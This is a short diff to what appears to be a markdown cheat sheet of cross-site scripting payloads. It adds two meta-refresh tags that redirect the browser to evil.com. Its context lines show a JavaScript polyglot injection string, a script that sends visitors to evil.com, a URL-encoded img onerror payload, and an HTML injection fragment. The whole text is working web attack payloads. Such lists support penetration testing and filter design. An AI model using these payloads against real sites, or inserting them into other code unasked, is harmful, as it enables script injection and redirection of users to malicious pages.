@@ -40,6 +40,9 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 ---
 
 ## Testing XSS in Various Scenarios
+```
+<meta http-equiv="refresh" content='0; url=https://evil.com/
+```
 ```javascript
 <script>document.location.href = "http://evil.com";</script>
 ```
@@ -120,6 +123,10 @@ y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
 ```
 ```html
 "><h1>cyborg71</h1>
+```
+**Redirect to a malicious page**
+```
+<meta http-equiv="refresh" content='0; url=https://evil.com/
 ```
 ```html
 <a href="https://google.com"></a>
